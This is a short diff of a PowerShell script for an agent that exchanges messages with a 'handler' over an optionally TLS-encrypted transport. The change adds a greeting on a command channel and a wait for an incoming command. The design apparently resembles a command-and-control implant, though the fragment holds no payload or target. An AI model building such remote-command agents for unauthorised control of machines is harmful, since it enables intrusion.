@@ -39,12 +39,17 @@ if ($CHANNELENCRYPTION -eq "NONE") {
     Exit(1)
 }
 
+# show hello message from handler
 $res = Message-ParseFromTransport $transport
-$res.content -join '' | Write-Output
-$message1 = Message-Create -MType 4 -Content "Test"
+$res = Message-Handle $transport $res
+
+# send hello message to handler
+$message1 = Message-Create -MType $MESSAGE_TYPE_MESSAGE -ChannelNumber $MESSAGE_CHANNEL_COMMAND -Content "Hello from Agent"
 Message-SendToTransport $message1 $transport
+
+# wait for command
 $res = Message-ParseFromTransport $transport
-$res.content -join '' | Write-Output
+$res = Message-Handle $transport $res
 
 if ($CHANNELENCRYPTION -eq "TLS") {
     Transport-Tls-Close $transport
